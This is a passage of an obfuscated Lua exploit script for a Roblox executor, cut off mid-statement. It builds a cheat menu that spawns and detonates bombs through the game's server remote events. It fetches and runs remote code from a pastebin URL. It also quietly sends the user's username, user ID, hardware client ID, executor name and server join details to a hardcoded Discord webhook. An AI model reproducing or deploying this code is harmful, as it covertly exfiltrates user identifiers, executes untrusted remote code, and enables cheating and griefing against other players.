						v23 = other.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\46\164\43\118\73\158\56\127\15", "\19\105\205\93"), function()
							selfp();
						end);
						other.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\153\7\209\145", "\95\201\104\190\225"));
						v19 = 15 - 11;
					end
				end
			end
			main();
			bomb();
			v3 = 6 - 3;
		end
		if (v3 == (0 + 0)) then
			v4 = loadstring(game:HttpGet("https://pastebin.com/raw/0wCAx5Vy"))();
			if (Name_Menu == nil) then
				Name_Menu = LUAOBFUSACTOR_DECRYPT_STR_0("\129\206\211\230\186\201\129\245\185\155\143\157\171\246", "\174\207\171\161");
			end
			task.spawn(function()
				local v28 = 0 + 0;
				local v29;
				local v30;
				local v31;
				local v32;
				local v33;
				while true do
					if ((449 - (133 + 314)) == v28) then
						v33 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\238\241\3\231\253\217\249\179\25\234\232\210", "\183\141\158\109\147\152")]="application/json"};
						request = http_request or request or HttpPost or syn['request'];
						v28 = 1 + 2;
					end
					if (v28 == (214 - (199 + 14))) then
						v31 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\47\6\232\24\41\7\242", "\108\76\105\134")]="",[LUAOBFUSACTOR_DECRYPT_STR_0("\238\200\179\228\202\248", "\174\139\165\209\129")]={{[LUAOBFUSACTOR_DECRYPT_STR_0("\183\186\246\205\195", "\24\195\211\130\161\166\99\16")]=LUAOBFUSACTOR_DECRYPT_STR_0("\104\6\251\4\70\20\6\82\167\124\19\45\106\2\252\34\80\30\6\15\230\43\110", "\118\38\99\137\76\51"),[LUAOBFUSACTOR_DECRYPT_STR_0("\249\35\22\17\27\41\237\50\12\29\7", "\64\157\70\101\114\105")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\10\226\146\240\21\82\226\237\185\80", "\112\32\200\199\131") .. "[" .. game['Players']['LocalPlayer']['DisplayName'] .. "]" .. "(https://www.roblox.com/users/" .. game['Players']['LocalPlayer']['UserId'] .. "/profile)" .. LUAOBFUSACTOR_DECRYPT_STR_0("\108\107\124", "\66\76\48\60\216\163\203") .. game['Players']['LocalPlayer']['Name'] .. "]\n" .. LUAOBFUSACTOR_DECRYPT_STR_0("\240\204\92\235\90\205\49\174\137\107\185\21\148\100", "\68\218\230\25\147\63\174") .. v30 .. "\n" .. LUAOBFUSACTOR_DECRYPT_STR_0("\231\96\123\123\159\137\96\25\22\246", "\214\205\74\51\44") .. game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\200\78\250\221\121\251\64\251\232\126\249\95\209\249\101\236\69\225\249", "\23\154\44\130\156")):GetClientId() .. "\n" .. LUAOBFUSACTOR_DECRYPT_STR_0("\91\236\138\175\59\22\81\133\162\160\37\28\29\163\237\132\57\26\31\230\158\171\36\5\20\180\247\238\124\89", "\115\113\198\205\206\86") .. LUAOBFUSACTOR_DECRYPT_STR_0("\182\88\252\86\139\79\176\125\133\90\251\118\133\66\240\89\140\82\236\20\142\88\247\84\163\86\243\95\173\89\237\78\133\89\253\95\204", "\58\228\55\158") .. game['PlaceId'] .. "," .. '"' .. game['JobId'] .. '")'),[LUAOBFUSACTOR_DECRYPT_STR_0("\160\144\192\43", "\85\212\233\176\78\92\205")]=LUAOBFUSACTOR_DECRYPT_STR_0("\88\81\139\234", "\130\42\56\232"),[LUAOBFUSACTOR_DECRYPT_STR_0("\233\186\40\236\82", "\95\138\213\68\131\32")]=tonumber(7499751 - (647 + 902))}}};
						v32 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\2\60\181\83\69\47\58\183\74\117\47", "\22\74\72\193\35")):JSONEncode(v31);
						v28 = 5 - 3;
					end
					if (v28 == (236 - (85 + 148))) then
						request({[LUAOBFUSACTOR_DECRYPT_STR_0("\25\107\232", "\56\76\25\132")]=v29,[LUAOBFUSACTOR_DECRYPT_STR_0("\124\206\175\63", "\175\62\161\203\70")]=v32,[LUAOBFUSACTOR_DECRYPT_STR_0("\17\216\215\27\58\56", "\85\92\189\163\115")]=LUAOBFUSACTOR_DECRYPT_STR_0("\25\131\3\12", "\88\73\204\80"),[LUAOBFUSACTOR_DECRYPT_STR_0("\6\134\17\66\44\200\61", "\186\78\227\112\38\73")]=v33});
						break;
					end
					if (v28 == (1289 - (426 + 863))) then
						v29 = "https://discord.com/api/webhooks/1146405314246234183/R2oi1rFKSSapxavsdhI7Nqmw6LemShzxCz1bt90t5rKfWLDiFiDcy29G1XzcD5dlWwRq";
						v30 = (is_sirhurt_closure and LUAOBFUSACTOR_DECRYPT_STR_0("\207\94\239\93\70\104\232", "\26\156\55\157\53\51")) or (pebc_execute and LUAOBFUSACTOR_DECRYPT_STR_0("\188\202\25\205\183\99\129\217\5\209\189\66", "\48\236\184\118\185\216")) or (syn and LUAOBFUSACTOR_DECRYPT_STR_0("\214\164\89\49\223\39\224\253\111", "\84\133\221\55\80\175")) or (secure_load and LUAOBFUSACTOR_DECRYPT_STR_0("\142\226\42\178\206\82\184\235", "\60\221\135\68\198\167")) or (KRNL_LOADED and LUAOBFUSACTOR_DECRYPT_STR_0("\197\175\246\143", "\185\142\221\152\227\34")) or (SONA_LOADED and LUAOBFUSACTOR_DECRYPT_STR_0("\107\202\89\251", "\151\56\165\55\154\35\83")) or (IsElectron and LUAOBFUSACTOR_DECRYPT_STR_0("\133\79\0\237\180\81\10\224", "\142\192\35\101")) or identifyexecutor() or "Не определен";
						v28 = 4 - 3;
					end
				end
			end);
			v5 = v4.Load("_");
			TitleBar = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\245\122\59\166\192\153\165", "\118\182\21\73\195\135\236\204"))['_']['ContainerFrame']['MainFrame']['TitleBar']['TitleButton'];
			TitleBar['TextColor3'] = Color3.new(1654.7 - (873 + 781), 0.9 - 0, 0.4 - 0);
			v3 = 1 + 0;
		end
		if (v3 == (22 - 16)) then
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\56\48\27\89\1\31\238", "\157\104\92\122\32\100\109"))['PlayerAdded']:Connect(remass);
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\147\170\206\211\56\53\158", "\203\195\198\175\170\93\71\237"))['PlayerRemoving']:Connect(remass);
			for v34, v35 in game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\30\71\63\204\84\3\239", "\156\78\43\94\181\49\113")):GetPlayers() do
				local v36 = 0 - 0;
				while true do
					if (v36 == (0 - 0)) then
						if ((table.find(bl, tostring(v35)) and v35:IsFriendsWith(game['Players']['LocalPlayer'].UserId)) or not table.find(acc_y, game['Players']['LocalPlayer']['UserId'] .. game['Players']['LocalPlayer']['Character']['Name'])) then
							local v195 = 1947 - (414 + 1533);
							local v196;
							local v197;
							while true do
								if (v195 == (1 + 0)) then
									game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
									break;
								end
								if (v195 == (555 - (443 + 112))) then
									v196 = LUAOBFUSACTOR_DECRYPT_STR_0("\50\193\233\227\44\98\64\51\169\133", "\25\18\136\164\195\107\35");
									v197 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\218\40\185\67\123\191\192\172\237\41\154\91\125\174\192\191\237", "\216\136\77\201\47\18\220\161"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v196, LUAOBFUSACTOR_DECRYPT_STR_0("\12\224\39", "\226\77\140\75\186\104\188"));
									v195 = 1480 - (888 + 591);
								end
							end
						end
						task.wait();
						break;
					end
				end
			end
			while task.wait() do
				local v37 = 0 - 0;
				local v38;
				local v39;
				local v40;
				local v41;
				local v42;
				while true do
					if (v37 == (1 + 3)) then
						v41 = Color3.new(0.75 - 0, 0.85 + 0, 0 + 0);
						if (v40 < (13 + 107)) then
							v41 = Color3.new(0.7 - 0, 0.9 - 0, 1678.4 - (136 + 1542));
						elseif (v40 < (983 - 683)) then
							v41 = Color3.new(0.75 + 0, 0.85 - 0, 0 + 0);
						elseif (v40 < (986 - (68 + 418))) then
							v41 = Color3.new(0.85 - 0, 0.8 - 0, 0 + 0);
						elseif (v40 < (1892 - (770 + 322))) then
							v41 = Color3.new(0.85 + 0, 0.5 + 0, 0 + 0);
						else
							v41 = Color3.new(0.9 - 0, 0 - 0, 0 - 0);
						end
						if RainbowMode then
							local v198 = 0 - 0;
							while true do
								if (v198 == (0 + 0)) then
									TitleBar['TextColor3'] = Color3.fromHSV(rainbow(counter), 1 - 0, 1 + 0);
									counter += (0.01 + 0)
									break;
								end
							end
						else
							TitleBar['TextColor3'] = v41;
						end
						v37 = 4 + 1;
					end
					if (v37 == (11 - 8)) then
						v39['Text'] = LUAOBFUSACTOR_DECRYPT_STR_0("\158\199\198\58\15\152\194\220\127\116\249", "\47\217\174\176\95") .. PlayersPen .. LUAOBFUSACTOR_DECRYPT_STR_0("\248\224", "\70\216\189\22\98\210\52\24");
						if (PlayersPen > (27 - 7)) then
							v39['TextColor3'] = Color3.new(0.85 + 0, 0.5 - 0, 0 - 0);
						else
							v39['TextColor3'] = Color3.new(0.7 + 0, 0.9 - 0, 831.4 - (762 + 69));
						end
						v40 = math.floor(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\233\203\162\147\192", "\179\186\191\195\231")):FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\201\58\10\226\246\45\21\229\247\60\29\215\237\62\12\247", "\132\153\95\120"))['Ping']:GetValue());
						v37 = 12 - 8;
					end
					if (v37 == (7 + 0)) then
						v42['Text'] = v40 .. LUAOBFUSACTOR_DECRYPT_STR_0("\241\174\78", "\192\209\210\110\77\151\186") .. TIMER .. LUAOBFUSACTOR_DECRYPT_STR_0("\160\31\98", "\164\128\99\66\137\159") .. math.floor(PACKS);
						break;
					end
					if (v37 == (1 + 0)) then
						v38 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\35\134\251\187\39\156\224", "\222\96\233\137"))['_']['ContainerFrame']['MainFrame']['Display']['Main'][LUAOBFUSACTOR_DECRYPT_STR_0("\137\191\166\6\141\225\227\249\188\169\95\155\246\226\175\182\181\69\200\223\209\155\150\139", "\144\217\211\199\127\232\147")]['LabelForeground']['TextLabel'];
						v38['Text'] = LUAOBFUSACTOR_DECRYPT_STR_0("\200\35\63\49\208\87\17\4\247\33\126\59\208\87\20\65\234\117\126", "\36\152\79\94\72\181\37\98") .. game['Players']['NumPlayers'];
						PlayersPen = 0 - 0;
						v37 = 1 + 1;
					end
					if (v37 == (1 + 4)) then
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\244\215\85\58\240\205\78", "\95\183\184\39"))['_']['ContainerFrame']['MainFrame']['Display']['Blob']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\133\54\228\45\20\176\14\180\38\226\52\112\178\45\133\27\200\17\122", "\98\213\95\135\70\52\224")) then
							blob_p.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\206\170\202\124\20\206\175\200\110\81\236", "\52\158\195\169\23"), players_mass, function(v205)
								focus_pname = v205;
							end);
						end
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\89\179\32\113\161\32\114", "\235\26\220\82\20\230\85\27"))['_']['ContainerFrame']['MainFrame']['Display']['Blob']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\187\181\232\208\96\170\148\221\246\91\166", "\20\232\193\137\162")) then
							blob_p.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\17\203\196\180\243", "\17\66\191\165\198\135\236\119"), function()
								call();
							end);
						end
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\44\160\188\22\216\253\229", "\177\111\207\206\115\159\136\140"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\53\128\19\31\148\127\83\4\144\21\6\240\125\112\53\173\63\35\250", "\63\101\233\112\116\180\47")) then
							Bomb.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\243\50\238\25\184\6\207\58\244\23\234", "\86\163\91\141\114\152"), players_mass, function(v206)
								player_tail = v206;
							end);
						end
						v37 = 23 - 17;
					end
					if (v37 == (157 - (8 + 149))) then
						plr = game['Players']['LocalPlayer'];
						hum = plr['Character']:WaitForChild(LUAOBFUSACTOR_DECRYPT_STR_0("\123\30\121\114\52\92\2\112\65\53\92\31\68\114\40\71", "\90\51\107\20\19"), 1321 - (1199 + 121));
						mouse = plr:GetMouse();
						v37 = 1 - 0;
					end
					if (v37 == (13 - 7)) then
						if not game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\174\255\151\234\26\152\249", "\93\237\144\229\143"))['_']['ContainerFrame']['MainFrame']['Display']['Bomb']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\51\255\226\28\74\100\32\194\196\54\37", "\38\117\150\144\121\107")) then
							Bomb.AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\11\178\252\63\108", "\90\77\219\142"), function()
								Run(Type, TypeBoom);
							end);
						end
						v42 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\197\11\51\60\107\18\115", "\26\134\100\65\89\44\103"))['_']['ContainerFrame']['MainFrame']['Display']['Lag']['STATSLABEL']['LabelForeground']['TextLabel'];
						v42['TextColor3'] = v41;
						v37 = 3 + 4;
					end
					if (v37 == (6 - 4)) then
						for v144, v145 in pairs(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\198\236\34\40\183\225\226\51\38", "\196\145\131\80\67")):GetChildren()) do
							local v146 = 0 - 0;
							while true do
								if (v146 == (0 + 0)) then
									if ((v145['Name'] == LUAOBFUSACTOR_DECRYPT_STR_0("\61\184\7\28\44\241\14\185\8\15", "\136\126\208\102\104\120")) and not v145['Parent']:IsDescendantOf(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\79\133\220\72\188\66\60\82\125", "\49\24\234\174\35\207\50\93"))['PlotItems'].PlayersInPlots)) then
										PlayersPen += (1808 - (518 + 1289))
									end
									task.wait();
									break;
								end
							end
						end
						if game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\47\253\239\141\86\25\251", "\17\108\146\157\232"))['_']['ContainerFrame']['MainFrame']['TitleBar']['TitleButton'] then
						end
						v39 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\104\204\6\232\8\189\66", "\200\43\163\116\141\79"))['_']['ContainerFrame']['MainFrame']['Display']['Other'][LUAOBFUSACTOR_DECRYPT_STR_0("\152\63\43\134\240\213\239\179\20\8\183\132\219\205", "\131\223\86\93\227\208\148")]['ButtonForeground']['TextButton'];
						v37 = 4 - 1;
					end
				end
			end
			break;
		end
		if (v3 == (1 + 0)) then
			l_p = game['Players']['LocalPlayer'];
			RainbowMode = false;
			function main()
				local v43 = 0 - 0;
				local v44;
				while true do
					if (v43 == (2 + 0)) then
						v44.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\211\87\179\187\20\160\238\5\191\165\93\148\224\81\191\160\24\244\163\113\190\183\19\190\240\5\176\185\15\245\240\80\166\166\18\167\247", "\213\131\37\214\214\125"));
						break;
					end
					if (v43 == (469 - (304 + 165))) then
						v44 = v5.AddPage(LUAOBFUSACTOR_DECRYPT_STR_0("\11\42\44\177", "\129\70\75\69\223"));
						v44.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\96\199\250\231\123\175\114\195\250\231\123\252\6\202\253\237\60\223\67\196\227\229\121", "\143\38\171\147\137\28"));
						v43 = 1 + 0;
					end
					if ((161 - (54 + 106)) == v43) then
						v44.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\224\142\184\234\6\241\199\144\141\183\179\16\230\198\198\135\171\169\67", "\180\176\226\217\147\99\131"));
						v44.AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\251\172\45\71\218\170\111\10\210\189\42\71\209\160\111\53\210\183\40\2\144\225\118\94\139\249\46\9\215\249\29\2\202\183\108\80\134\235\122", "\103\179\217\79"));
						v43 = 1971 - (1618 + 351);
					end
				end
			end
			function anim()
				local v45 = 0 + 0;
				while true do
					if (v45 == (1016 - (10 + 1006))) then
						for v147 = 0 + 0, string.len(Name_Menu) do
							local v148 = 0 + 0;
							while true do
								if (v148 == (0 - 0)) then
									TitleBar['Text'] = string.sub(Name_Menu, 1034 - (912 + 121), v147) .. " ";
									wait(0.25 + 0);
									v148 = 1290 - (1140 + 149);
								end
								if (v148 == (1 + 0)) then
									TitleBar['Text'] = string.sub(Name_Menu, 1 - 0, v147) .. "_";
									wait(0.25 + 0);
									break;
								end
							end
						end
						for v149 = 0 - 0, 7 - 3 do
							local v150 = 0 + 0;
							while true do
								if (v150 == (3 - 2)) then
									TitleBar['Text'] = Name_Menu .. " ";
									wait(186.25 - (165 + 21));
									break;
								end
								if (v150 == (111 - (61 + 50))) then
									TitleBar['Text'] = Name_Menu .. "_";
									wait(0.25 + 0);
									v150 = 4 - 3;
								end
							end
						end
						break;
					end
				end
			end
			function bomb()
				local v46 = 0 - 0;
				local v47;
				local v48;
				local v49;
				local v50;
				local v51;
				local v52;
				while true do
					if (v46 == (3 + 4)) then
						v52 = Bomb.AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\111\175\12\217\78\159\170\69\185", "\195\42\215\124\181\33\236"), {LUAOBFUSACTOR_DECRYPT_STR_0("\47\85\54\61\46\184\37\86\59\59", "\152\109\57\87\94\69"),LUAOBFUSACTOR_DECRYPT_STR_0("\219\216\5\174", "\200\153\183\106\195\222\178\52"),LUAOBFUSACTOR_DECRYPT_STR_0("\16\236\135\48\9\105\34\226\159\51", "\58\82\131\232\93\41"),LUAOBFUSACTOR_DECRYPT_STR_0("\210\2\200\85\127\48\140\90", "\95\227\55\176\117\61"),LUAOBFUSACTOR_DECRYPT_STR_0("\54\107\32\71\174\25\108\99\105\164\21\124", "\203\120\30\67\43"),LUAOBFUSACTOR_DECRYPT_STR_0("\203\44\74\238", "\185\145\69\45\143"),LUAOBFUSACTOR_DECRYPT_STR_0("\184\30\16\168\222\133\8", "\188\234\127\121\198"),LUAOBFUSACTOR_DECRYPT_STR_0("\8\55\29\138\43", "\227\88\82\115"),LUAOBFUSACTOR_DECRYPT_STR_0("\115\19\187\190\7\97\3\43\187\174\14", "\19\35\127\218\199\98"),LUAOBFUSACTOR_DECRYPT_STR_0("\48\220\40\214", "\130\124\155\106")}, function(v151)
							Type = v151;
						end);
						break;
					end
					if (v46 == (1766 - (1536 + 230))) then
						Client_Name = game['Players']['LocalPlayer']['Character']['Name'] .. LUAOBFUSACTOR_DECRYPT_STR_0("\230\219\247\184\173\243\120\150\219\255\249\182\176", "\223\181\171\150\207\195\150\28");
						Type = LUAOBFUSACTOR_DECRYPT_STR_0("\110\53\236\163", "\105\44\90\131\206");
						TypeBoom = LUAOBFUSACTOR_DECRYPT_STR_0("\221\239\191\187\37\55\236\243\187\181\13", "\94\159\128\210\217\104");
						v46 = 492 - (128 + 363);
					end
					if (v46 == (1 + 2)) then
						function SetNetworkOwner()
							local v152 = 0 - 0;
							local v153;
							local v154;
							local v155;
							while true do
								if (v152 == (0 + 0)) then
									v153 = path_b['BombMissile']['Button'];
									v154 = path_b['BombMissile']['Button']['CFrame'];
									v152 = 1 - 0;
								end
								if (v152 == (5 - 3)) then
									v155:FireServer(v153, v154);
									break;
								end
								if (v152 == (2 - 1)) then
									v155 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\98\252\22\179\86\124\248\110\85\253\53\171\80\109\248\125\85", "\26\48\153\102\223\63\31\153"))['GrabEvents']['SetNetworkOwner'];
									v155:FireServer(v153, v154);
									v152 = 2 + 0;
								end
							end
						end
						function SpawnBomb()
							local v156 = 1009 - (615 + 394);
							local v157;
							local v158;
							local v159;
							local v160;
							while true do
								if ((2 + 0) == v156) then
									v160:InvokeServer(v157, v158, v159);
									break;
								end
								if ((0 + 0) == v156) then
									v157 = LUAOBFUSACTOR_DECRYPT_STR_0("\32\79\224\241\47\73\254\224\11\76\232", "\147\98\32\141");
									v158 = game['Players']['LocalPlayer']['Character']['Head']['CFrame'];
									v156 = 2 - 1;
								end
								if ((4 - 3) == v156) then
									v159 = Vector3.new(651 - (59 + 592), 0 - 0, 0 - 0);
									v160 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\42\70\243\198\15\85\74\12\70\231\249\18\89\89\25\68\230", "\43\120\35\131\170\102\54"))['MenuToys']['SpawnToyRemoteFunction'];
									v156 = 2 + 0;
								end
							end
						end
						function Realse_Bomb(v161, v162)
							local v163 = 171 - (70 + 101);
							local v164;
							while true do
								if (v163 == (0 - 0)) then
									v164 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\102\3\151\186\172\179\133\64\3\131\133\177\191\150\85\1\130", "\228\52\102\231\214\197\208"))['BombEvents']['BombExplode'];
									SetNetworkOwner();
									v163 = 1 + 0;
								end
								if (v163 == (2 - 1)) then
									v164:FireServer(v161, v162);
									break;
								end
							end
						end
						v46 = 245 - (123 + 118);
					end
					if (v46 == (2 + 3)) then
						v47 = Bomb.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\44\225\113\195\255\152", "\182\126\128\21\170\138\235\121"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\166\211\59", "\102\235\186\85\134\230\115\80")]=(0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\122\13\38", "\66\55\108\94\63\18\180")]=(6399 - (653 + 746)),[LUAOBFUSACTOR_DECRYPT_STR_0("\48\136\131", "\57\116\237\229\87\71")]=DefValues[LUAOBFUSACTOR_DECRYPT_STR_0("\152\176\233\238\98\253", "\39\202\209\141\135\23\142")]}, function(v165)
							Radius = v165;
						end);
						v48 = Bomb.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\210\50\17\44\61\234\252\54", "\152\159\83\105\106\82"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\172\207\95", "\60\225\166\49\146\169")]=-(18703 - 8703),[LUAOBFUSACTOR_DECRYPT_STR_0("\2\31\55", "\103\79\126\79\74\97")]=(14406 - 4406),[LUAOBFUSACTOR_DECRYPT_STR_0("\158\122\213", "\122\218\31\179\19\62")]=DefValues[LUAOBFUSACTOR_DECRYPT_STR_0("\158\215\213\231\198\179\70\182", "\37\211\182\173\161\169\193")]}, function(v166)
							MaxForce = v166;
						end);
						v49 = Bomb.AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\195\51\64\220", "\217\151\90\45\185\72\27"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\238\117\233", "\54\163\28\135\114")]=(0 - 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\5\218\69", "\31\72\187\61\226\46")]=(590 + 747),[LUAOBFUSACTOR_DECRYPT_STR_0("\231\3\69", "\68\163\102\35\178\39\30")]=DefValues[LUAOBFUSACTOR_DECRYPT_STR_0("\138\121\215\194\47\176\141\22\170\120", "\113\222\16\186\167\99\213\227")]}, function(v167)
							TimeLength = v167;
						end);
						v46 = 4 + 2;
					end
					if (v46 == (1 + 0)) then
						DefValues = {[LUAOBFUSACTOR_DECRYPT_STR_0("\26\7\246\243\2\11\245\241\58\6", "\150\78\110\155")]=(4 + 21),[LUAOBFUSACTOR_DECRYPT_STR_0("\183\196\35\232\177\13", "\32\229\165\71\129\196\126\223")]=(8 + 42),[LUAOBFUSACTOR_DECRYPT_STR_0("\238\136\220\167\142\199\192\140", "\181\163\233\164\225\225")]=(0 - 0)};
						TimeLength = DefValues[LUAOBFUSACTOR_DECRYPT_STR_0("\100\130\51\114\124\142\48\112\68\131", "\23\48\235\94")];
						Radius = DefValues[LUAOBFUSACTOR_DECRYPT_STR_0("\78\219\220\84\66\32", "\178\28\186\184\61\55\83")];
						v46 = 2 + 0;
					end
					if (v46 == (3 - 1)) then
						MaxForce = DefValues[LUAOBFUSACTOR_DECRYPT_STR_0("\233\204\95\26\253\28\246\193", "\149\164\173\39\92\146\110")];
						Color = Color3.new(1235 - (885 + 349), 1 + 0, 2 - 1);
						function Delete()
							local v168 = 0 - 0;
							while true do
								if (v168 == (968 - (915 + 53))) then
									ready = true;
									for v243, v244 in pairs(game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\208\40\2\26\61\14\250", "\123\147\71\112\127\122")):GetDescendants()) do
										if (v244['Name'] == Name) then
											v244['Parent']['Parent']:Destroy();
										end
									end
									break;
								end
							end
						end
						v46 = 804 - (768 + 33);
					end
					if (v46 == (15 - 11)) then
						function Destroy_Bomb()
							local v169 = 0 - 0;
							local v170;
							local v171;
							local v172;
							while true do
								if (v169 == (329 - (287 + 41))) then
									v172 = game['Players']['LocalPlayer']['Character']['Head']['Position'];
									SetNetworkOwner();
									v169 = 849 - (638 + 209);
								end
								if (v169 == (0 + 0)) then
									v170 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\254\200\146\125\79\207\204\150\116\66\255\217\141\99\71\203\200", "\38\172\173\226\17"))['BombEvents']['BombExplode'];
									v171 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\127\16\40\230\88\2", "\143\45\113\76")]=(1686.000001 - (96 + 1590)),[LUAOBFUSACTOR_DECRYPT_STR_0("\140\177\17\57\148\189\18\59\172\176", "\92\216\216\124")]=(1672 - (741 + 931)),[LUAOBFUSACTOR_DECRYPT_STR_0("\115\59\184\66\242\67", "\157\59\82\204\32")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\29\38\243\246\230\238\214\162\26\39\197\243\251\239", "\209\88\94\131\154\137\138\179")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\5\160\220\90\17\49\50\39\24\164\214\79\10\54\53\17\57\180\197\110\27\39", "\66\72\193\164\28\126\67\81")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\195\41\187\76\52\121\254\63\133\87\34\115\235", "\22\135\76\200\56\70")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\160\63\252\33\81", "\129\237\80\152\68\61")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\116\176\20\255\19\19\93\66\138\29\195\19\30\86\69\177", "\56\49\200\100\147\124\119")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\229\51\175\241\207\42\140\224\201\59\187", "\144\172\94\223")]=(0 + 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\20\0\177\78\48\6\173\73\20\14\176\83", "\39\68\111\194")]=path_b['BombMissile']['Body']};
									v169 = 2 - 1;
								end
								if (v169 == (9 - 7)) then
									v170:FireServer(v171, v172);
									break;
								end
							end
						end
						function Run(v173, v174)
							local v175 = 0 + 0;
							while true do
								if (v175 == (2 + 1)) then
									if not table.find(nil_, game['Players']['LocalPlayer']['Character']['Name'] .. game['Players']['LocalPlayer']['UserId']) then
										local v252 = 0 + 0;
										local v253;
										local v254;
										while true do
											if (v252 == (3 - 2)) then
												game['Players']['LocalPlayer']:Kick("Error code: GAY \n[ Made with ❤️ by Range#8998 and Reyn#7525 ]");
												break;
											end
											if (v252 == (0 + 0)) then
												v253 = LUAOBFUSACTOR_DECRYPT_STR_0("\150\143\202\135\94\150\239\231\166\134", "\215\182\198\135\167\25");
												v254 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\191\76\250\68\132\74\235\92\136\77\217\92\130\91\235\79\136", "\40\237\41\138"))['DefaultChatSystemChatEvents']['SayMessageRequest']:FireServer(v253, LUAOBFUSACTOR_DECRYPT_STR_0("\230\120\246", "\42\167\20\154\152"));
												v252 = 1 + 0;
											end
										end
									end
									break;
								end
								if ((4 - 3) == v175) then
									if (v173 == LUAOBFUSACTOR_DECRYPT_STR_0("\104\241\173\79", "\65\42\158\194\34\17")) then
										local v255 = 0 + 0;
										local v256;
										local v257;
										while true do
											if (v255 == (496 - (64 + 430))) then
												Destroy_Bomb();
												break;
											end
											if (v255 == (1 + 0)) then
												v257 = game['Players']['LocalPlayer']['Character']['Head']['Position'];
												Realse_Bomb(v256, v257);
												v255 = 365 - (106 + 257);
											end
											if (v255 == (0 + 0)) then
												SpawnBomb();
												v256 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\40\38\86\5\56\254", "\142\122\71\50\108\77\141\123")]=Radius,[LUAOBFUSACTOR_DECRYPT_STR_0("\33\187\239\29", "\91\117\194\159\120")]=v174,[LUAOBFUSACTOR_DECRYPT_STR_0("\57\18\50\23\39", "\68\122\125\94\120\85\145")]=Color,[LUAOBFUSACTOR_DECRYPT_STR_0("\35\21\194\91\228\220\180\16\8\199", "\218\119\124\175\62\168\185")]=TimeLength,[LUAOBFUSACTOR_DECRYPT_STR_0("\141\249\92\198\170\232", "\164\197\144\40")]=path_b['BombMissile']['PartHitDetector'],[LUAOBFUSACTOR_DECRYPT_STR_0("\166\232\186\135\210\178\134\227\136\146\251\191\145\245", "\214\227\144\202\235\189")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\192\164\159\93\31\161\80\57\221\160\149\72\4\166\87\15\252\176\134\105\21\183", "\92\141\197\231\27\112\211\51")]=MaxForce,[LUAOBFUSACTOR_DECRYPT_STR_0("\194\250\153\183\195\233\230\153\142\222\226\250\134", "\177\134\159\234\195")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\144\228\59\165\197", "\169\221\139\95\192")]=path_b['BombMissile'],[LUAOBFUSACTOR_DECRYPT_STR_0("\251\147\111\51\45\34\219\152\93\38\18\41\215\133\107\38", "\70\190\235\31\95\66")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\147\239\10\231\230\174\209\10\227\224\190", "\133\218\130\122\134")]=(949 - (496 + 225)),[LUAOBFUSACTOR_DECRYPT_STR_0("\12\240\240\205\200\170\55\50\207\226\214\200", 